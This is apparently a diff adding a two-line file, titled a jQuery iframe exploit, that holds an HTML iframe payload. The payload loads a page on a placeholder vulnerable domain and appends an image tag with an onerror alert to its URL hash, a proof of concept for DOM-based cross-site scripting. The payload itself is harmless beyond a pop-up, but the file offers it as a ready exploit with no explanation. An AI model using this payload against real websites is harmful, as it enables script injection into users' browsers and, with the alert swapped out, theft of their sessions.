@@ -1,0 +1,2 @@
+#JQuery iframe own server exploit
+<iframe src="https://vulnerable.domain/#" onload="this.src+='<img src=x onerror=alert(1)>'"></iframe>
